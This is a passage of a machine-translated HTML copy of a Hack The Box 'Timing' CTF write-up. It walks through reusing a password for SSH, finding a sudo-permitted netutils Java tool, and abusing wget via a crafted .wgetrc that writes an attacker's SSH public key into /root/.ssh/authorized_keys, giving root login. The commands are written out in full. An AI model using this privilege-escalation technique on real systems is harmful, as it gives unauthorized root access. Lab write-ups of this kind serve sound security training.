mf"><div class="gh gi nk"><img src="../Images/af5dc98107ea2f52a21f89afb5fc385d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jVd9HzTisSen3NqQr7puxQ.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">使用diff检查文件夹之间的更改</figcaption></figure><h1 id="9169" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">宋承宪饰演亚伦</h1><p id="4d25" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">唯一的变化是我们之前用aaron在SSH上尝试的db_conn.php文件中的密码。让我们试试这个:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="555f" class="mu kn iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timing/extracted]<br/>└─# ssh aaron@timing.htb<br/>aaron@timing.htb's password: <br/>Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)<br/><br/>  System information as of Wed Dec 22 17:45:49 UTC 2021<br/><br/>Last login: Wed Dec 22 17:41:31 2021 from 10.10.14.124<br/>aaron@timing:~$</span></pre><p id="2e70" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好吧，我们知道这是可行的，不是吗！</p><h1 id="4cf6" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">Sudo权限</h1><p id="c38f" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">像往常一样，在使用LinPEAS之类的东西之前，检查几个明显的东西。在这里，我从sudo开始，这是正确的地方:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="ae16" class="mu kn iq mq b gy mv mw l mx my">aaron@timing:~$ sudo -l<br/>Matching Defaults entries for aaron on timing:<br/>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br/><br/>User aaron may run the following commands on timing:<br/>    (ALL) NOPASSWD: /usr/bin/netutils</span></pre><h1 id="c396" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">易受攻击的Java应用程序</h1><p id="589e" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">什么是netutils:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="e045" class="mu kn iq mq b gy mv mw l mx my">aaron@timing:~$ file /usr/bin/netutils<br/>/usr/bin/netutils: Bourne-Again shell script, ASCII text executable<br/><br/>aaron@timing:~$ cat /usr/bin/netutils<br/>#! /bin/bash<br/>java -jar /root/netutils.jar</span></pre><p id="9856" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个shell脚本在根文件夹中运行一个Java应用程序，我们可以在没有密码的情况下以root身份运行它。听起来很有趣，让我们看看它有什么作用:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="b703" class="mu kn iq mq b gy mv mw l mx my">aaron@timing:~$ sudo /usr/bin/netutils<br/>netutils v0.1<br/>Select one option:<br/>[0] FTP<br/>[1] HTTP<br/>[2] Quit<br/>Input &gt;&gt;</span></pre><p id="388f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个util有两个选项，FTP或HTTP，无论你选择哪个，然后要求一个文件。这可以远程托管，所以让我们先在Kali上启动一个web服务器:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="5565" class="mu kn iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timing]<br/>└─# python3 -m http.server 80</span></pre><p id="9cf8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在切换回盒子，试着从Kali那里获取一个文件:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="3c78" class="mu kn iq mq b gy mv mw l mx my">netutils v0.1<br/>Select one option:<br/>[0] FTP<br/>[1] HTTP<br/>[2] Quit<br/>Input &gt;&gt; 0<br/>Enter Url+File: 10.10.14.12/pencer.jpg</span></pre><p id="5cb6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我试着抓取我们之前用FTP制作的假jpg，但是什么也没发生。在Kali上检查我的网络服务器，没有连接尝试。我们试试http:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="298c" class="mu kn iq mq b gy mv mw l mx my">netutils v0.1<br/>Select one option:<br/>[0] FTP<br/>[1] HTTP<br/>[2] Quit<br/>Input &gt;&gt; 1<br/>Enter Url: http://10.10.14.12/pencer.jpg<br/>Initializing download: http://10.10.14.12/pencer.jpg<br/>File size: 28 bytes<br/>Opening output file pencer.jpg<br/>Server unsupported, starting from scratch with one connection.<br/>Starting download<br/>Downloaded 28 byte in 0 seconds. (0.27 KB/s)</span></pre><p id="9090" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这看起来更有希望。在Kali上检查我们的网络服务器，我看到一个来自盒子的连接，并且文件被取回。在本地查看，我看到该文件在那里，它由root所有。</p><h1 id="86a9" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">Pspy64</h1><p id="ec45" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">我们可以使用wget获取一个文件，所以我们可以假设这个util中有一个我们需要利用的漏洞。为了理解它是如何工作的，让我们使用pspy64，就像我们在其他许多时候做的那样，最近是在<a class="ae kl" href="https://app.hackthebox.com/machines/355" rel="noopener ugc nofollow" target="_blank"> Static </a>上。如果你还没有从<a class="ae kl" href="https://github.com/DominicBreuker/pspy" rel="noopener ugc nofollow" target="_blank">这里</a>抓取，我已经有了，所以只需要把它复制到我在Kali上运行的web服务器的路径上:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="b5c1" class="mu kn iq mq b gy mv mw l mx my">┌──(root💀kali)-[~]<br/>└─# locate pspy64<br/>/root/htb/static/pspy64<br/><br/>┌──(root💀kali)-[~]<br/>└─# cd htb/timing<br/><br/>┌──(root💀kali)-[~/htb/timing]<br/>└─# cp /root/htb/static/pspy64 .</span></pre><p id="067c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在回到盒子上，把pspy64拉过来，开始运转:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nl"><img src="../Images/7f078e6a3da84ebd46d1e0eaa2ed99c4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4345YFcxufb5g_wENcM_6A.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">Pspy在盒子上运行</figcaption></figure><p id="74d9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在我们当前的SSH会话中运行，登录到第二个会话，然后再次运行netutils。像以前一样，对FTP使用选项0，对HTTP使用选项1，再次尝试获取我的pencer.jpg文件。现在切换回pspy64会话，看看发生了什么:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nl"><img src="../Images/091eb655470cea31bc7d5ef3697ebed4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1z1AJ3E2nk76_S6KQs3HrA.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">Pspy显示正在使用wget</figcaption></figure><h1 id="fb33" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">Wget漏洞利用</h1><p id="d444" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">我们可以看到netutils java应用程序使用wget进行FTP连接，使用axel进行HTTP连接。我后来发现通过利用axel来完成这个盒子是可能的，但是我是使用FTP来完成的，所以我们将遵循那个方法。</p><p id="ea43" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">还有另一个叫Kotarak的HTB盒子也有类似的路径，<a class="ae kl" href="https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html" rel="noopener ugc nofollow" target="_blank">这个</a>走过帮助了我。需要知道的关键部分是wget在运行时会寻找一个启动文件。从这里的文档<a class="ae kl" href="https://www.gnu.org/software/wget/manual/html_node/Wgetrc-Location.html" rel="noopener ugc nofollow" target="_blank">我们可以看到它是如何工作的:</a></p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="d33f" class="mu kn iq mq b gy mv mw l mx my">When initializing, Wget will look for a global startup file, /usr/local/etc/wgetrc by default (or some prefix other than /usr/local, if Wget was not installed there) and read commands from there, if it exists.<br/><br/>Then it will look for the user’s file. If the environmental variable WGETRC is set, Wget will try to load that file. Failing that, no further attempts will be made.<br/><br/>If WGETRC is not set, Wget will try to load $HOME/.wgetrc.</span></pre><p id="1827" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这个盒子上，我们发现没有全局文件，所以我们可以通过创建我们自己的文件来利用它。aaron的/home文件夹中的wgetrc文件。查看可用的命令<a class="ae kl" href="https://www.gnu.org/software/wget/manual/html_node/Wgetrc-Commands.html" rel="noopener ugc nofollow" target="_blank">这里</a>我们看到有一个选项可以设置检索文件的名称和路径。我们可以以root用户身份运行java应用程序，这样我们就可以将/root作为可写位置进行访问。让我们把Kali公共SSH密钥放在那里，这样我们就可以以root用户身份登录，不需要密码。</p><p id="caf0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先创建。/home/aaron中的wgetrc配置文件:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="042b" class="mu kn iq mq b gy mv mw l mx my">aaron@timing:~$ cat &lt;&lt;_EOF_&gt;.wgetrc<br/>&gt; output_document = /root/.ssh/authorized_keys<br/>&gt; _EOF_</span></pre><p id="cc61" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果需要，在Kali上创建我们的SSH密钥:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="dd35" class="mu kn iq mq b gy mv mw l mx my">┌──(root💀kali)-[~]<br/>└─# ssh-keygen          <br/>Generating public/private rsa key pair.<br/>Enter file in which to save the key (/root/.ssh/id_rsa): <br/>Enter passphrase (empty for no passphrase): <br/>Enter same passphrase again: <br/>Your identification has been saved in /root/.ssh/id_rsa<br/>Your public key has been saved in /root/.ssh/id_rsa.pub<br/>The key fingerprint is:<br/>SHA256:B/SsKx8Z8AU/c40jKybaq8OpWpTVdl2Yz0e/ktMxXxY root@kali<br/>The key's randomart image is:<br/>+---[RSA 3072]----+<br/>|        o  o.    |<br/>|     . . *o. o.E |<br/>|    . + o Xo+....|<br/>|   o . + + *o..o+|<br/>|  o   . S o  .o.*|<br/>| .   o o *   + o.|<br/>|  ....o +     o  |<br/>| .  +  + .       |<br/>|.....o. .        |<br/>+----[SHA256]-----+</span></pre><p id="0ed6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将公钥的副本放在我们的工作文件夹中:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="fe14" class="mu kn iq mq b gy mv mw l mx my">┌──(root💀kali)-[~]<br/>└─# cp .ssh/id_rsa.pub htb/timing</span></pre><h1 id="a9e1" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">Python FTP服务器</h1><p id="545a" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">如果需要，安装Python3 FTP库:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nm"><img src="../Images/9ec224c8f9dfd5db49bfb8f2a7678ee2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2PteNGaxYJWli2i0CdlScg.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">安装pyftpdlib</figcaption></figure><p id="66d2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在启动一个FTP服务器，这样我们就可以获得我们的SSH公钥:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="255a" class="mu kn iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timing]<br/>└─# python3 -m pyftpdlib -p 21<br/>[I 2021-12-29 22:15:26] concurrency model: async<br/>[I 2021-12-29 22:15:26] masquerade (NAT) address: None<br/>[I 2021-12-29 22:15:26] passive ports: None<br/>[I 2021-12-29 22:15:26] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=1597 &lt;&lt;&lt;</span></pre><p id="6871" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">切换回盒子，再次运行netutils应用程序，这次为FTP选择0，并输入我们的Kali IP和我们托管在那里的SSH公钥:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="09f7" class="mu kn iq mq b gy mv mw l mx my">aaron@timing:~$ sudo /usr/bin/netutils<br/>netutils v0.1<br/>Select one option:<br/>[0] FTP<br/>[1] HTTP<br/>[2] Quit<br/>Input &gt;&gt; 0<br/>Enter Url+File: 10.10.14.12/id_rsa.pub</span></pre><p id="b452" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在回到卡利，检查文件被要求:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nn"><img src="../Images/42435da6074fe85bf333e49deb30b307.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RU6AfT34n48qT3qUp0A68A.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">Kali上运行的FTP服务器</figcaption></figure><h1 id="1292" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">SSH作为Root用户</h1><p id="d9e0" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">是的，所以启动一个新的终端，以root用户身份登录到机器:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="ee64" class="mu kn iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timing]<br/>└─# ssh root@timing.htb  <br/>Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)<br/>Last login: Tue Dec  7 12:08:29 2021<br/>root@timing:~#</span></pre><p id="930b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">抓住旗子，我们就完成了:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="c0df" class="mu kn iq mq b gy mv mw l mx my">root@timing:~# cat /root/root.txt <br/>&lt;HIDDEN&gt;</span></pre><p id="8fcf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">又一个盒子完成了。我真的很喜欢这个，因为它需要相当多的思考才能完成。下次见。</p></div><div class="ab cl no np hu nq" role="separator"><span class="nr bw bk ns nt nu"/><span class="nr bw bk ns nt nu"/><span class="nr bw bk ns nt"/></div><div class="ij ik il im in"><p id="9159" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)</p><p id="cd4d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">推特—<a class="ae kl" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>网站— <a class="ae kl" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="9a2e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="nv">原载于2022年6月3日</em><a class="ae kl" href="https://pencer.io/ctf/ctf-htb-timing" rel="noopener ugc nofollow" target="_blank"><em class="nv">https://pencer . io</em></a><em class="nv">。</em></p></div></div>    
</body>
</html>